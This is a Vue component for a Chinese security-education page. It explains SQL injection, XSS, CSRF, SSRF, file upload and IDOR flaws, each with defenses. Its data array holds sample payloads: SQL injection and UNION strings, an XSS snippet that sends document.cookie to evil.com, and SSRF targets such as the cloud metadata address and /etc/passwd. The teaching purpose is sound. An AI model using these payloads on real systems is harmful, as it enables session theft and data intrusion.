<template>
  <section class="page-hero">
    <div class="hero-bg-orb hero-bg-orb--cyan" style="width:350px;height:350px;opacity:0.08;top:-5%;right:-5%"></div>
    <div class="hero-bg-orb hero-bg-orb--purple" style="width:250px;height:250px;opacity:0.06;bottom:0;left:-5%"></div>
    <div class="container">
      <nav aria-label="面包屑导航"><div class="breadcrumb">
        <router-link to="/">首页</router-link><span class="sep">/</span>
        <router-link to="/notes">学习笔记</router-link><span class="sep">/</span>
        <span>漏洞详情</span>
      </div></nav>
      <h1>漏洞<span class="highlight">深度分析</span></h1>
      <p>深入理解漏洞原理、攻击向量与完整防御策略</p>
    </div>
  </section>

  <section class="section" style="padding-top: 0;">
    <div class="container">
      <div class="detail-layout">
        <!-- 侧边栏导航 -->
        <aside class="detail-sidebar">
          <div style="position: sticky; top: 100px;">
            <div class="card card-glass" style="padding: 1.5rem;">
              <h4 style="margin-bottom: 1rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--color-text-tertiary);">内容导航</h4>
              <nav class="detail-nav">
                <a :href="'#' + a.id" class="detail-nav-link" :class="{ 'is-active': activeId === a.id }" v-for="a in articles" :key="a.id">{{ a.label }}</a>
              </nav>
            </div>
          </div>
        </aside>

        <!-- 主内容 -->
        <div>
          <article v-for="a in articles" :key="a.id" :id="a.id" class="card card-glow-cyan detail-article" style="margin-bottom: 2rem; padding: 2.5rem;">
            <div class="flex-between" style="margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
              <h2 style="font-size: 1.8rem;" v-html="a.icon + ' ' + a.title"></h2>
              <span :class="['badge', 'risk-' + a.risk]">{{ riskLabel(a.risk) }}</span>
            </div>
            <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
              <span class="badge badge-cyan">{{ a.owasp }}</span>
              <span class="badge badge-blue">{{ a.cwe }}</span>
              <span class="badge badge-purple">{{ a.category }}</span>
            </div>

            <h3>漏洞原理</h3>
            <p>{{ a.principle }}</p>

            <!-- 终端示例 -->
            <div v-if="a.terminalLines" class="terminal-box" style="margin: 1.5rem 0;">
              <div class="terminal-header">
                <span class="terminal-dot terminal-dot--red"></span>
                <span class="terminal-dot terminal-dot--yellow"></span>
                <span class="terminal-dot terminal-dot--green"></span>
                <span class="terminal-title">攻击示例 — bash</span>
              </div>
              <div class="terminal-body">
                <div v-for="(line, i) in a.terminalLines" :key="i" v-html="line"></div>
              </div>
            </div>

            <!-- 攻击类型网格 -->
            <div v-if="a.attackTypes" class="grid grid-2" style="margin: 1rem 0;">
              <div v-for="(at, i) in a.attackTypes" :key="i" class="card card-glass" style="padding: 1.25rem;">
                <strong>{{ at.name }}</strong>
                <p style="font-size:0.85rem; margin-top:0.3rem;">{{ at.desc }}</p>
              </div>
            </div>

            <h3>防御方案</h3>
            <ul style="color: var(--color-text-secondary); line-height: 2; padding-left: 1.5rem;">
              <li v-for="(d, i) in a.defenses" :key="i" v-html="d"></li>
            </ul>
          </article>
        </div>
      </div>
    </div>
  </section>
</template>

<script setup>
import { ref, onMounted, onUnmounted, nextTick } from 'vue'
import { useRoute } from 'vue-router'

const route = useRoute()

const articles = [
  {
    id: 'sqli', label: 'SQL 注入',
    icon: '🗄️', title: 'SQL 注入 (SQL Injection)',
    risk: 'critical', owasp: 'OWASP A03:2021', cwe: 'CWE-89', category: '注入类',
    principle: '当应用程序将用户输入直接拼接到 SQL 查询语句中时，攻击者可以通过构造特殊的输入来改变 SQL 语句的语义，从而执行非预期的数据库操作。',
    terminalLines: [
      '<span class="prompt">$</span> <span class="cmd"># 正常查询语句</span>',
      'SELECT * FROM users WHERE name = \'<span style="color:var(--color-accent-red);">admin</span>\'',
      '<div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># 攻击者输入: admin\'--</span></div>',
      'SELECT * FROM users WHERE name = \'<span style="color:var(--color-accent-red);">admin\'--</span>\'',
      '<div style="margin-top: 0.5rem; color: var(--color-accent-red);"># -- 是 SQL 注释符，后续的密码验证部分被注释掉了</div>',
      '<div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># UNION 注入获取数据</span></div>',
      'SELECT * FROM users WHERE id = \'<span style="color:var(--color-accent-red);">1\' UNION SELECT username,password FROM users--</span>\''
    ],
    attackTypes: [
      { name: '基于报错的注入', desc: '通过数据库错误信息推断表结构' },
      { name: '基于布尔的盲注', desc: '通过页面响应差异判断查询结果' },
      { name: '基于时间的盲注', desc: '通过响应延迟时间判断数据' },
      { name: 'UNION 联合查询', desc: '合并多个查询结果集获取数据' }
    ],
    defenses: ['<strong>参数化查询</strong>：使用 Prepared Statement，将 SQL 逻辑与数据分离', '<strong>ORM 框架</strong>：使用成熟的 ORM 自动处理查询参数化', '<strong>输入校验</strong>：对用户输入进行白名单验证', '<strong>最小权限</strong>：数据库账户使用最小必要权限', '<strong>WAF</strong>：部署 Web 应用防火墙进行规则过滤', '<strong>错误处理</strong>：不向用户展示详细的数据库错误信息']
  },
  {
    id: 'xss', label: '跨站脚本 (XSS)',
    icon: '💉', title: '跨站脚本 (XSS)',
    risk: 'high', owasp: 'OWASP A03:2021', cwe: 'CWE-79', category: '客户端安全',
    principle: '攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，脚本在受害者浏览器中执行。根据注入方式不同，分为反射型、存储型和 DOM 型三种。',
    terminalLines: [
      '<span class="prompt">$</span> <span class="cmd"># 反射型 XSS — URL 参数注入</span>',
      '<div style="color:var(--color-accent-red);">https://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>',
      '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 存储型 XSS — 留言板注入</span></div>',
      '<div style="color:var(--color-accent-red);">&lt;img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)"&gt;</div>',
      '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># DOM 型 XSS — innerHTML 直接插入</span></div>',
      'document.getElementById(\'msg\').<span style="color:var(--color-accent-red);">innerHTML</span> = location.hash.slice(1);'
    ],
    attackTypes: [],
    defenses: ['<strong>输出编码</strong>：对插入 HTML 的数据进行实体编码', '<strong>CSP</strong>：配置 Content-Security-Policy 限制脚本来源', '<strong>HttpOnly Cookie</strong>：防止 JavaScript 读取敏感 Cookie', '<strong>避免危险 API</strong>：不使用 innerHTML/document.write/eval', '<strong>前端框架</strong>：Vue/React 默认会对插值进行转义']
  },
  {
    id: 'csrf', label: 'CSRF 攻击',
    icon: '🎭', title: '跨站请求伪造 (CSRF)',
    risk: 'high', owasp: 'OWASP A01:2021', cwe: 'CWE-352', category: '会话安全',
    principle: '攻击者诱导已登录用户访问恶意页面，利用浏览器自动携带 Cookie 的特性，向目标网站发送伪造请求，在用户不知情的情况下执行敏感操作（如修改密码、转账）。',
    terminalLines: [],
    attackTypes: [],
    defenses: ['<strong>Anti-CSRF Token</strong>：每个表单嵌入随机 Token，服务端校验', '<strong>SameSite Cookie</strong>：设置 SameSite=Strict/Lax 限制跨站发送', '<strong>Referer/Origin 校验</strong>：检查请求来源是否为可信域名', '<strong>二次验证</strong>：敏感操作要求输入密码或验证码', '<strong>自定义请求头</strong>：使用 X-Requested-With 等自定义 Header']
  },
  {
    id: 'ssrf', label: 'SSRF 攻击',
    icon: '🔄', title: '服务端请求伪造 (SSRF)',
    risk: 'high', owasp: 'OWASP A10:2021', cwe: 'CWE-918', category: '服务端安全',
    principle: '应用程序从用户输入中获取 URL 并发起请求，攻击者通过构造内网地址或特殊协议 URL，诱导服务器访问内部系统，绕过防火墙访问受保护的资源。',
    terminalLines: [
      '<span class="prompt">$</span> <span class="cmd"># 读取云服务器元数据 (AWS)</span>',
      '<div style="color:var(--color-accent-red);">http://169.254.169.254/latest/meta-data/</div>',
      '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 扫描内网端口</span></div>',
      '<div style="color:var(--color-accent-red);">http://192.168.1.1:6379/ (Redis)</div>',
      '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 利用 file 协议读取文件</span></div>',
      '<div style="color:var(--color-accent-red);">file:///etc/passwd</div>'
    ],
    attackTypes: [],
    defenses: ['<strong>URL 白名单</strong>：仅允许访问预定义的域名或 IP 范围', '<strong>协议限制</strong>：仅允许 http/https 协议', '<strong>内网地址过滤</strong>：拒绝 127.0.0.1/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16', '<strong>DNS 解析校验</strong>：解析后检查 IP 是否属于内网', '<strong>网络隔离</strong>：代理服务器与内网资源分离部署']
  },
  {
    id: 'file-upload', label: '文件上传漏洞',
    icon: '📤', title: '文件上传漏洞',
    risk: 'critical', owasp: 'OWASP A04:2021', cwe: 'CWE-434', category: '文件安全',
    principle: '应用程序未对上传文件进行充分的类型、扩展名和内容校验，攻击者可上传包含恶意代码的文件（如 PHP WebShell），在服务器端执行任意命令。',
    terminalLines: [],
    attackTypes: [],
    defenses: ['<strong>文件类型白名单</strong>：只允许指定的文件扩展名和 MIME 类型', '<strong>内容检测</strong>：检测文件 Magic Number（文件头）而非仅依赖扩展名', '<strong>文件重命名</strong>：使用随机生成的文件名，避免保留原始扩展名', '<strong>存储隔离</strong>：上传目录与执行目录分离', '<strong>权限控制</strong>：上传目录设置最小权限', '<strong>病毒扫描</strong>：集成 ClamAV 等工具扫描恶意文件']
  },
  {
    id: 'idor', label: 'IDOR 越权',
    icon: '🔑', title: '不安全的直接对象引用 (IDOR)',
    risk: 'medium', owasp: 'OWASP A01:2021', cwe: 'CWE-639', category: '权限问题',
    principle: '应用程序使用用户提供的标识符（如 ID 号）直接访问后端对象，但未验证当前用户是否拥有对该对象的访问权限，导致越权访问。',
    terminalLines: [],
    attackTypes: [],
    defenses: ['<strong>服务端权限校验</strong>：每次访问对象时验证当前用户身份与权限', '<strong>使用 UUID/GUID</strong>：使用不可预测的随机标识符替代自增 ID', '<strong>间接引用映射</strong>：使用 Session 级别的对象引用映射表', '<strong>最小权限原则</strong>：用户只能访问自己拥有的资源']
  }
]

function riskLabel(risk) {
  const map = { critical: '严重', high: '高危', medium: '中危', low: '低危' }
  return map[risk] || risk
}

// ---- 侧边栏滚动高亮 ----
const activeId = ref(articles[0].id)
const HEADER_OFFSET = 120
let ticking = false

function updateActiveSection() {
  const scrollBottom = window.scrollY + window.innerHeight
  if (scrollBottom >= document.documentElement.scrollHeight - 8) {
    activeId.value = articles[articles.length - 1].id
    return
  }
  let current = articles[0].id
  for (let i = 0; i < articles.length; i++) {
    const el = document.getElementById(articles[i].id)
    if (el && el.getBoundingClientRect().top <= HEADER_OFFSET) {
      current = articles[i].id
    }
  }
  activeId.value = current
}

function onScroll() {
  if (!ticking) {
    requestAnimationFrame(() => { updateActiveSection(); ticking = false })
    ticking = true
  }
}

onMounted(() => {
  window.addEventListener('scroll', onScroll, { passive: true })
  updateActiveSection()

  // URL 参数 ?id= 定位
  const id = route.query.id
  if (id) {
    nextTick(() => {
      const el = document.getElementById(id)
      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' })
    })
  }
})

onUnmounted(() => {
  window.removeEventListener('scroll', onScroll)
})
</script>
